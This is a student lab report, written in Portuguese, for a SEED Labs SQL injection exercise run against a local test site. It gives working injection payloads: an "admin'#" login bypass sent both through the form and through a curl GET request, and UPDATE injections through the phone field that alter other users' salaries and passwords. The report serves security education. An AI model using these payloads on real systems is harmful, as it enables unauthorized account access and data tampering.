# Trabalho realizado na semana 8

 Na fase de configuração, adicionamos uma nova entrada (10.9.0.5 www.seed-server.com) aos hosts conhecidos pela máquina virtual. Em seguida, iniciamos os containers Docker e abrimos uma shell SQL.

 ## Task 1

 A primeira tarefa consiste em selecionar os dados do utilizador Alice atrvés da shell SQL. Para isso executamos o seguinte comando:

```sql
SELECT * FROM credentials WHERE Name = "Alice";
```

![Task 1](../images/image1lab8.png)

## Task 2

### Task 2.1

Analisamos o ficheiro unsafe_home.php, e constatamos que o input do utilizador não é sanitizado, desta forma, existe uma vulnerabilidade a ser explorada. Para isso, acedemos ao site "www.seed-server.com" onde temos de inserir um username e uma password, sendo esta última cifrada. Assim, e tendo em conta a query, bastou inserir no campo do username o valor "admin'#" para que a verificação da password fosse comentada e termos acesso à conta admin.

![Task 2](../images/image2lab8.png)

### Task 2.2

Esta task é semalhante à anterior mas desta vez exploramos a vulnerabilidade através pedido HTTP GET. Para tal, e como é referido no enunciado, temos de cifrar os caracteres especiais ' e #, respetivamente %27 e %23, chegando assim ao seguinte comando:

```bash
curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
```

Conseguimos assim o código html da página obtida na task anterior:

```html
!DOCTYPE html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link href="css/style_home.css" type="text/css" rel="stylesheet">

  <!-- Browser Tab title -->
  <title>SQLi Lab</title>
</head>
<body>
  <nav class="navbar fixed-top navbar-expand-lg navbar-light" style="background-color: #3EA055;">
    <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
      <a class="navbar-brand" href="unsafe_home.php" ><img src="seed_logo.png" style="height: 40px; width: 200px;" alt="SEEDLabs"></a>

      <ul class='navbar-nav mr-auto mt-2 mt-lg-0' style='padding-left: 30px;'><li class='nav-item active'><a class='nav-link' href='unsafe_home.php'>Home <span class='sr-only'>(current)</span></a></li><li class='nav-item'><a class='nav-link' href='unsafe_edit_frontend.php'>Edit Profile</a></li></ul><button onclick='logout()' type='button' id='logoffBtn' class='nav-link my-2 my-lg-0'>Logout</button></div></nav><div class='container'><br><h1 class='text-center'><b> User Details </b></h1><hr><br><table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Username</th><th scope='col'>EId</th><th scope='col'>Salary</th><th scope='col'>Birthday</th><th scope='col'>SSN</th><th scope='col'>Nickname</th><th scope='col'>Email</th><th scope='col'>Address</th><th scope='col'>Ph. Number</th></tr></thead><tbody><tr><th scope='row'> Alice</th><td>10000</td><td>20000</td><td>9/20</td><td>10211002</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Boby</th><td>20000</td><td>30000</td><td>4/20</td><td>10213352</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ryan</th><td>30000</td><td>50000</td><td>4/10</td><td>98993524</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Samy</th><td>40000</td><td>90000</td><td>1/11</td><td>32193525</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ted</th><td>50000</td><td>110000</td><td>11/3</td><td>32111111</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Admin</th><td>99999</td><td>400000</td><td>3/5</td><td>43254314</td><td></td><td></td><td></td><td></td></tr></tbody></table>      <br><br>
      <div class="text-center">
        <p>
          Copyright &copy; SEED LABs
        </p>
      </div>
    </div>
    <script type="text/javascript">
    function logout(){
      location.href = "logoff.php";
    }
    </script>
  </body>
  </html>
  ```

  ### Task 2.3

  Para esta tarefa é necessário inserir dois statements no lugar de um, contudo, isso não funciona no MySQL porque a extensão mysqli do PHP, mais especificamente a API mysqli::query(), não permite a execução de múltiplas queries no servidor e não é possível contornar essa limitação usando a função mysqli->multiquery().

  ## Task 3

  ### Task 3.1

  Após darmos login na conta da Alice da mesma forma que acedemos à conta do admin, acedemos à página Edit Profile. Esta página é controlada através do ficheiro unsafe_edit_backend.php, o qual utiliza strings de input do utilizador que não são sanitizadas. Usamos o mesmo ataque anterior mas desta vez no phone number pois é o último campo, inserimos assim o valor "926773412',Salary='1" e alteramos o salário da Alice.

  ![Task 3](../images/image3lab8.png)

  ### Task 3.2

  Para alterar o salário de outro utilizador, aplicamos uma abordagem semelhante à mencionada anteriormente. Contudo, desenvolvemos uma cláusula WHERE com o nome desse utilizador e comentamos a parte da query relativa ao Id do perfil em que nos encontramos, "926773412',Salary='0' WHERE Name='Boby'#".

   ![Task 3](../images/image4lab8.png)

  ### Task 3.3

  Para alterar a password de outro utilizador, utilizamos a abordagem anterior mas temos de ter em conta que a password vai ser cifrada com criptografia SHA1. Para isso, utilizamos um encriptador online para encriptar a palavra "weak":

  ![Task 3](../images/image5lab8.png)

  Através desta nova password "weak", entramos na conta do Boby:

  ![Task 3](../images/image6lab8.png)
